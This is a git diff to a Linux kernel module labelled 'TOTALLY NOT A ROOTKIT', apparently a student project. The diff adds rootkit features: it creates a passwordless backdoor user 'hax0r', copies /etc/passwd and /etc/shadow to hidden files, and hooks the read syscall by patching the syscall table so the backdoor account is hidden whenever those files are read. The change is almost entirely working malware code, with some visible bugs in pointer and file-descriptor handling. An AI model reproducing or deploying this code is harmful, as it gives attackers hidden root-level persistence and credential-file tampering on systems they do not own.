@@ -7,6 +7,10 @@
 #include <linux/sched.h>
 #include <linux/cred.h>
 #include <linux/uidgid.h>
+#include <linux/file.h>
+#include <linux/kmod.h>
+#include <linux/umh.h>
+#include <linux/fs.h>
 
 #define CR0_WRITE_UNLOCK(x)                       \
     do                                            \
@@ -24,10 +28,22 @@
     } while (0)
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Khan");
+MODULE_AUTHOR("Khan, Kleiman, Gao, Son");
 MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
 static unsigned long *sys_call_table; //points to kernel's syscall table
+static typeof(sys_read) *actual_open;
+static unsigned int *module_init_complete;
+volatile unsigned int vol_disable_h;
+
+/**
+ * So that we can return a pathname and its kernel page from 1 function.
+ */
+typedef struct PathData
+{
+    char *path_name;
+    char *tmp_loc;
+} PathData;
 
 //max numTargets
 #define numTargets 5
@@ -148,8 +164,239 @@ void restoreSyscalls(void)
     }
 }
 
+/**
+ * Create old (fake) passwd & shadow file
+ * Basically, a copy of the /etc/passwd file and /etc/shadow file before we add our secret user
+ */
+void create_fake_files(void)
+{
+    vol_disable_h = 1;
+
+    char *envp[] = {"HOME=/", NULL};
+
+    // NOTE: probably want to hide these files with the "ls" part of the rootkit
+    char *argv1[] = {"/bin/cp", "/etc/passwd", "/etc/.fakepasswd", NULL};
+    char *argv2[] = {"/bin/cp", "/etc/shadow", "/etc/.fakeshadow", NULL};
+
+    printk(KERN_INFO "attempting to duplicate/create fake files\n");
+
+    if (call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC) < 0)
+    {
+        printk(KERN_INFO "unable to copy passwd\n");
+    }
+
+    if (call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC) < 0)
+    {
+        printk(KERN_INFO "unable to copy shadow\n");
+    }
+
+    vol_disable_h = 0;
+}
+
+/**
+ * Create the backdoor user, which would be hidden while module is loaded
+ */
+void create_backdoor_user(void)
+{
+    vol_disable_h = 1;
+
+    char *envp[] = {"HOME=/", NULL};
+
+    // add "-p" followed by a hashed password to specify a password.
+    // currently, anyone can login to the account without a password.
+    // char *argv[] = { "/usr/sbin/useradd", "-u", "33333", "-g", "haxor", "-d", "/home/haxor", "-s", "/bin/bash", "haxor", NULL };
+    char *argv[] = {"/usr/sbin/useradd", "hax0r", NULL};
+
+    printk(KERN_INFO "attempting to create hacker user\n");
+
+    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC) < 0)
+    {
+        printk(KERN_INFO "unable to create backdoor user\n");
+    }
+
+    vol_disable_h = 0;
+
+    return;
+}
+
+/**
+ * Removes the backdoor user
+ */
+void remove_backdoor_user(void)
+{
+    vol_disable_h = 1;
+
+    char *envp[] = {"HOME=/", NULL};
+    char *argv[] = {"/usr/sbin/deluser", "hax0r", NULL};
+
+    printk(KERN_INFO "attempting to remove hacker user\n");
+
+    if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC) < 0)
+    {
+        printk(KERN_INFO "unable to remove backdoor user\n");
+    }
+
+    vol_disable_h = 0;
+
+    return;
+}
+
+/**
+ * Get the full path from a given fd
+ */
+void set_path_from_fd(int fd, PathData *data)
+{
+    // parse the file path from the current fd
+    char *tmp_loc;
+    char *path_name;
+    struct file *tmp_file;
+    struct path *tmp_path;
+
+    tmp_file = fget(fd);
+    if (!tmp_file)
+    {
+        printk(KERN_INFO "unable to get file struct ptr from fd\n");
+
+        // set path_name to nothing - so as to tell callee that it failed
+        data->tmp_loc = NULL;
+
+        return;
+    }
+
+    tmp_path = &tmp_file->f_path;
+    path_get(tmp_path);
+
+    // get a free mem page to store the path in
+    tmp_loc = (char *)__get_free_page(GFP_KERNEL);
+    if (!tmp_loc)
+    {
+        printk(KERN_INFO "unable to get free page of kernel memory for buffering path_name\n");
+
+        // put to buff
+        path_put(tmp_path);
+
+        // set path_name to nothing - so as to tell callee that it failed
+        data->tmp_loc = NULL;
+
+        // free the page here, b/c callee function only free's if this function was successful
+        free_page((unsigned long)tmp_loc);
+
+        return;
+    }
+
+    path_name = d_path(tmp_path, tmp_loc, PAGE_SIZE);
+    path_put(tmp_path);
+
+    // reached error with the pathname
+    if (IS_ERR(path_name))
+    {
+        printk(KERN_INFO "error pathname return\n");
+
+        // set path_name to nothing - so as to tell callee that it failed
+        data->tmp_loc = NULL;
+
+        // free the page here, b/c callee function only free's if this function was successful
+        free_page((unsigned long)tmp_loc);
+
+        return;
+    }
+
+    // printk(KERN_INFO "valid pathname return\n");
+    // reached - hence a valid file/path was parsed from a fd.
+    data->path_name = path_name;
+    data->tmp_loc = tmp_loc;
+
+    return;
+}
+
+/**
+ * Spoof reader event handler
+ */
+static asmlinkage long hooked_spoof_read(int fd, char __user *buf, size_t size)
+{
+    // check whether init has completed.
+    // if it hasn't - then operate as normal
+    if (module_init_complete != 1)
+    {
+        printk(KERN_INFO "init not complete yet");
+
+        return actual_open(fd, buf, size);
+    }
+
+    // set the pathname from the fd
+    PathData data_ptr;
+    data_ptr.tmp_loc = NULL; // preset this to null just-incase...
+    set_path_from_fd(fd, &data_ptr);
+
+    // reaches block if there was an error reading the filepath from the fd
+    if (data_ptr.tmp_loc == NULL)
+    {
+        printk(KERN_INFO "null tmp_loc so return real file");
+
+        return actual_open(fd, buf, size);
+    }
+
+    // got a file_path - determine if it's what we want.
+    // determine whether pathname is a file we spoofed
+    if (strcmp(data_ptr.path_name, "/etc/passwd") == 0)
+    {
+        // cleanup allocated kernel page
+        if (data_ptr.tmp_loc != NULL)
+        {
+            free_page((unsigned long)data_ptr.tmp_loc);
+        }
+
+        // if hack is disabled - volatile so right before we do it.
+        if (vol_disable_h == 1)
+        {
+            return actual_open(fd, buf, size);
+        }
+
+        printk(KERN_INFO "reading passwd file\n");
+
+        // remove the hacked user (aka hide it)
+        // this volatile function returns immediately but actually only gets executed 1s later.
+        // thus the user should recieve read of the file that doesn't have the hacker yet.
+        remove_backdoor_user();
+        // volatile_create_backdoor_user();
+
+        return actual_open(fd, buf, size);
+    }
+    else if (strcmp(data_ptr.path_name, "/etc/shadow") == 0)
+    {
+        // cleanup allocated kernel page
+        if (data_ptr.tmp_loc != NULL)
+        {
+            free_page((unsigned long)data_ptr.tmp_loc);
+        }
+
+        // if hack is disabled - volatile so right before we do it.
+        if (vol_disable_h == 1)
+        {
+            return actual_open(fd, buf, size);
+        }
+
+        printk(KERN_INFO "reading shadow file\n");
+
+        // remove the hacked user (aka hide it)
+        // this volatile function returns immediately but actually only gets executed 1s later.
+        // thus the user should recieve read of the file that doesn't have the hacker yet.
+        remove_backdoor_user();
+        // volatile_create_backdoor_user();
+
+        return actual_open(2, buf, size);
+    }
+
+    // cleanup allocated kernel page
+    free_page((unsigned long)data_ptr.tmp_loc);
+
+    return actual_open(fd, buf, size);
+}
+
 int __init loadMod(void)
 {
+    vol_disable_h = 1;
+
     //get and store sys_call_table ptr
     sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
     if (sys_call_table == NULL)
@@ -181,7 +428,22 @@ int __init loadMod(void)
     totallyReal_syscallPtrs[4] = (void *)&totallyReal_kill;
     toInject[4] = 1;
 
+    // create the fake files
+    create_fake_files();
+
+    // create the hacker user
+    create_backdoor_user();
+
+    // allow writing on x86
+    CR0_WRITE_UNLOCK({
+        actual_open = (typeof(sys_read) *)sys_call_table[__NR_read];
+        sys_call_table[__NR_read] = (void *)&hooked_spoof_read;
+    });
+
     injectSyscalls();
+
+    module_init_complete = 1;
+    vol_disable_h = 0;
 
     return 0;
 }
@@ -189,6 +451,9 @@ int __init loadMod(void)
 void __exit unloadMod(void)
 {
     pr_info("notarootkit unloading\n");
+
+    // remove the backdoor account from the /etc/passwd & shadow file
+    remove_backdoor_user();
 
     restoreSyscalls();
 
